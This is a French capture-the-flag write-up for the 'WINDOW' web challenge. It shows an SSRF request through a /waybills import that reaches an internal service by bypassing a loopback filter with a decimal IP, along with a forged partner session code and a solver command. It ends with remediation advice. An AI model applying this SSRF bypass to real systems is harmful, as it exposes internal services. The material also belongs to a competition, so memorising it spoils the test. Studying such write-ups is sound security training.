# WINDOW

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | WINDOW |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Non documentée |
| Points | Non documentés |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | HTTP, codes partenaires, SSRF, JSON |
| Validation | Aucune validation plateforme exportée |

## 1. Introduction

Déterminer la fenêtre active de prise en charge.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

## 2. Énoncé du challenge

- Q4 — Objectif reconstitué de la note ; énoncé intégral de la carte absent.

### Objectif

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

Fournir à l'équipe d'interception la **fenêtre horaire exacte** de la prise en
charge de l'opération d'exfiltration de Thomas Crown.

## 3. Analyse initiale

1 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

### État initial

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

- Cible : `http://172.28.38.2:8080`
- Session partenaire obtenue via `PRT.<id>.<integrite>` (voir q:2).
- SSRF `/waybills` opérationnelle vers `http://2130706433:8081`
  (contournement du filtre loopback par notation décimale).
- Opération connue : `OP-24-7319`, expédition `NL-24-7K42`.

## 4. Reconnaissance et investigation

### Reconnaissance

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

La spécification `/docs` du service de coordination expose
`/api/operations/<operation_id>/assignments` (« Historique des affectations »).

```bash
curl -s -X POST http://172.28.38.2:8080/waybills \
     --cookie 'session=<...>' \
     -d 'source_url=http://2130706433:8081/api/operations/OP-24-7319/assignments'
```

Réponse (deux affectations) :

```json
{
  "operation_id": "OP-24-7319",
  "assignments": [
    {
      "id": "ASG-310",
      "meeting_point": "Porte est — aire 2",
      "status": "cancelled",
      "time_start": "<heure de début — annulée>",
      "time_end":   "<heure de fin — annulée>",
      "vehicle": "Break gris"
    },
    {
      "id": "ASG-318",
      "meeting_point": "Hangar C4 — quai de service nord",
      "registration": "NV-482-KR",
      "status": "active",
      "support_id": "NV-USB-84F2",
      "time_start": "<heure de début — active>",
      "time_end":   "<heure de fin — active>",
      "vehicle": "Fourgon bleu nuit"
    }
  ]
}
```

## 5. Identification du mécanisme

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente.

### Interprétation

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

Deux affectations existent :

- `ASG-310` est **annulée** : elle ne doit pas servir de base à
  l'interception (véhicule et point de rendez-vous obsolètes).
- `ASG-318` est **active** : c'est la seule fenêtre valide. Elle correspond au
  lieu déjà connu (`Hangar C4 — quai de service nord`) et au véhicule
  opérationnel (`Fourgon bleu nuit`, immatriculation `NV-482-KR`, support
  `NV-USB-84F2`).

Les horodatages sont fournis en ISO 8601 avec l'offset `+00:00` (UTC). La
fenêtre exacte soumise est l'intervalle `time_start` → `time_end` de
l'affectation active.

## 6. Exploitation ou résolution

### Exploitation

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

```bash
python3 solveur.py --target http://172.28.38.2:8080 \
  --code PRT.<id>.<integrite> --q4
```

Le script filtre les affectations sur `status == "active"` et affiche les
bornes de la fenêtre.

### Validation reproductible (sans la réponse)

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

1. Rejouer la requête `assignments` ci-dessus.
2. Vérifier qu'il existe exactement une affectation `status: "active"` pour
   `OP-24-7319`.
3. Confirmer que son `meeting_point` est `Hangar C4 — quai de service nord` et
   que son véhicule est `Fourgon bleu nuit`.
4. La fenêtre attendue est l'intervalle `time_start`–`time_end` de cette
   affectation, à comparer à la valeur attendue par la plateforme.

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

Les outils partagés sont inventoriés dans [THE GATE](../the-gate/README.md). Les arguments spécifiques à cette question sont ceux des notes historiques.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Q4 — Objectif reconstitué de la note ; énoncé intégral de la carte absent. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Aucune validation plateforme exportée |

## 9. Difficultés rencontrées

### Chemins qui ont échoué

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

- `/api/operations/OP-24-7319/window`, `/api/window`, `/api/windows`,
  `/api/timeline` : `404` — aucune route dédiée à une « fenêtre ».
- `/` sur le sidecar : `404` (seuls `/docs`, `/api/...`, `/flag` existent).
- Filtre `?status=active` sur `/assignments` : ignoré par le service, les deux
  affectations sont renvoyées ; le filtrage doit être fait côté client.
- La fiche `/api/operations/OP-24-7319` ne contient aucune heure ; seule la
  sous-route `/assignments` porte les horodatages.

## 10. Analyse technique approfondie

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Lier cryptographiquement le type de code à son identifiant ; appliquer une autorisation par opération et affectation. Normaliser et contrôler les adresses résolues avant toute requête serveur et isoler les services internes.

## 12. Conclusion

Déterminer la fenêtre active de prise en charge. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Aucune validation plateforme exportée.

### Leçons

Source : [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt)

- Toujours filtrer sur le statut : une affectation annulée constitue un leurre
  crédible (autre véhicule, autre lieu, autres horaires).
- Les horodatages ISO avec offset doivent être lus en UTC ; ne pas confondre
  avec l'heure locale du scénario.
- Une API peut ignorer silencieusement un paramètre de filtre : ne pas se fier
  à `?status=active`, filtrer soi-même.
- La valeur attendue par la plateforme est une forme compacte de l'intervalle
  (`HH:MM-HH:MM`), pas les horodatages ISO complets : l'énoncé prime sur le
  format brut de l'API.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [writeup-WINDOW.md](evidence/web-depart-writeup-window-md.txt) — origine : `web/depart/writeup-WINDOW.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

